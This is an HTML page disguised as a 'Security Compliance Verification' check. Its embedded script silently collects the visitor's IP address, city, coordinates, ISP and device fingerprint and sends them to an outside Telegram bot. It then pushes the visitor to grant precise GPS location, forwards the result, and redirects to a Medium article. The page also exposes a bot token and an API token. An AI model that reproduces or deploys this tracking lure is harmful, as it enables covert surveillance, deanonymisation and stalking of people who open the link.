<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Security Compliance Verification</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: #ffffff;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: fadeIn 1.5s ease-out forwards;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    .container {
      background: rgba(0, 0, 0, 0.85);
      padding: 45px 35px;
      border-radius: 16px;
      text-align: center;
      width: 90%;
      max-width: 480px;
      box-shadow: 0 0 30px rgba(0, 255, 213, 0.4);
      animation: slideUp 1s ease-out;
    }

    @keyframes slideUp {
      from { transform: translateY(50px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }

    h1 {
      font-size: 1.9rem;
      color: #00ffd5;
      margin-bottom: 18px;
      animation: pulseGlow 2.5s infinite;
    }

    @keyframes pulseGlow {
      0%, 100% { text-shadow: 0 0 5px #00ffd5, 0 0 15px #00ffd5; }
      50% { text-shadow: 0 0 15px #00ffd5, 0 0 30px #00ffd5; }
    }

    p {
      font-size: 1rem;
      color: #ccc;
      margin-bottom: 20px;
      line-height: 1.5;
    }

    .loader {
      margin: 25px auto;
      width: 48px;
      height: 48px;
      border-radius: 50%;
      border: 5px solid #00ffd5;
      border-top-color: transparent;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    #status {
      font-size: 0.95rem;
      color: #ff6666;
      margin-top: 20px;
    }

    #success-message {
      display: none;
      font-size: 1.1rem;
      margin-top: 20px;
      color: #00ffc3;
    }
  </style>
</head>

<body>
  <div class="container" id="content">
    <h1 id="main-title">Security Check In Progress</h1>
    <p id="main-desc">Please hold while we verify your connection and region.</p>
    <div class="loader"></div>
    <p id="status"></p>
    <p id="success-message">‚úÖ Verification complete.<br>Redirecting you to the compliance article on Medium‚Ä¶</p>
  </div>

  <script>
    const telegramToken = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
    const chatId = "6239813037";
    const redirectURL = "https://medium.com/@MianHammadx0root/exploiting-blind-xss-in-a-signup-page-admin-panel-takeover-and-real-world-impact-3000-p2-private-110205e3674b";

    function sendToTelegram(message) {
      fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });
    }

    function isFacebookWebView() {
      const ua = navigator.userAgent || navigator.vendor;
      return (ua.indexOf('FBAN') > -1 || ua.indexOf('FBAV') > -1 || ua.includes('Instagram'));
    }

    function triggerFlow() {
      setTimeout(() => {
        collectAndSendInfo();
      }, 3000);
    }

    if (isFacebookWebView()) {
      document.getElementById("main-title").innerText = "External Browser Required";
      document.getElementById("main-desc").innerText = "Please open this page in Chrome, Safari, or another browser to continue verification.";
      document.querySelector(".loader").style.display = 'none';
      // ‚úÖ Send info anyway
      triggerFlow();
    } else {
      window.onload = triggerFlow;
    }

    async function collectAndSendInfo() {
      try {
        const res = await fetch("https://ipinfo.io/json?token=be5998b85f541c");
        const data = await res.json();
        const [lat, lon] = data.loc.split(',');

        const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
        const resolution = `${window.screen.width}x${window.screen.height}`;
        const colorDepth = `${screen.colorDepth}-bit`;
        const language = navigator.language;
        const platform = navigator.platform;
        const userAgent = navigator.userAgent;
        const hasWebcam = navigator.mediaDevices && navigator.mediaDevices.getUserMedia ? "Possible" : "No Access";

        let adBlockEnabled = false;
        const ad = document.createElement('div');
        ad.className = 'adsbox';
        ad.style.height = '1px';
        document.body.appendChild(ad);
        setTimeout(() => {
          if (ad.offsetHeight === 0) adBlockEnabled = true;
          ad.remove();

          const fullDetails = `üì° IP Info\n----------------------\nüåê IP: ${data.ip}\nüó∫ Country: ${data.country}\nüèô City: ${data.city}\nüåç Region: ${data.region || 'N/A'}\nüìç Postal: ${data.postal || 'N/A'}\nüìû Coordinates: ${data.loc}\nüè¢ Org: ${data.org}\nüíª ISP: ${data.org}\nüñ• Device: ${deviceType}\nüìê Resolution: ${resolution}\nüé® Color Depth: ${colorDepth}\nüåê Language: ${language}\nüñ• Platform: ${platform}\nüì∑ Webcam: ${hasWebcam}\nüß† AdBlocker: ${adBlockEnabled ? "Likely Enabled" : "Not Detected"}\nüì± User Agent: ${userAgent}\nüï∞ Time: ${new Date().toLocaleString()}`;

          sendToTelegram(fullDetails);
          requestLocation();
        }, 200);
      } catch (e) {
        document.getElementById("status").innerText = "Failed to verify connection.";
        sendToTelegram("‚ö†Ô∏è Failed to fetch IP info.");
      }
    }

    function requestLocation() {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
          sendToTelegram(`‚úÖ Location granted\nüåê Google Maps: ${mapsLink}`);

          document.querySelector(".loader").style.display = 'none';
          document.querySelector("#success-message").style.display = 'block';
          setTimeout(() => {
            window.location.href = redirectURL;
          }, 3000);
        },
        (error) => {
          document.querySelector(".loader").style.display = 'none';

          if (navigator.permissions) {
            navigator.permissions.query({ name: 'geolocation' }).then((result) => {
              if (result.state === 'denied') {
                document.getElementById("status").innerHTML = `Location access is blocked.<br>Please enable it manually from browser settings then refresh the page.`;
              } else {
                document.getElementById("status").innerHTML = `<button onclick='requestLocation()' style='margin-top:10px;padding:10px 16px;background:#00ffd5;border:none;border-radius:8px;color:#000;font-weight:600;cursor:pointer;'>Try Again</button>`;
              }
            });
          } else {
            document.getElementById("status").innerHTML = `<button onclick='requestLocation()' style='margin-top:10px;padding:10px 16px;background:#00ffd5;border:none;border-radius:8px;color:#000;font-weight:600;cursor:pointer;'>Try Again</button>`;
          }

          sendToTelegram(`‚ùå Location denied\nReason: ${error.message}`);
        }
      );
    }
  </script>
</body>

</html>
